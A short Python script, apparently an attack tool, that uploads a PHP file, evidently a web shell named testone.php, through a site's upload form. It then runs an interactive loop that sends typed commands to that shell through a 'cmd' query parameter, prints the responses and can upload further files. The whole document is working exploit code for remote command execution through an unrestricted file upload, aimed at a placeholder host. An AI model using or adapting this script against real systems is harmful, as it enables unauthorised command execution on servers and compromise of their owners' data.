import requests

url="https://example.com/?"

#headers={'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundary5tBS5SLzak42PAxi'}

with open('testone.php','rb') as f:
    files={'upfile':f} #check the params first
    r=requests.post(url, files=files)

while True:
    cmd=input('enter command: ')
    link=f"https://example.com/images/testone.php?cmd={cmd}"
    if "upload it" in cmd:
        cmd=cmd.split()
        with open(cmd[2],'rb') as f:
            files={'upfile':f}
            r=requests.post(url, files=files)
            print(r.text)
            continue
    r=requests.get(link)
    if "gif file share" in r.text.lower():
        print('retry time boi')
        quit()
    print(r.text)
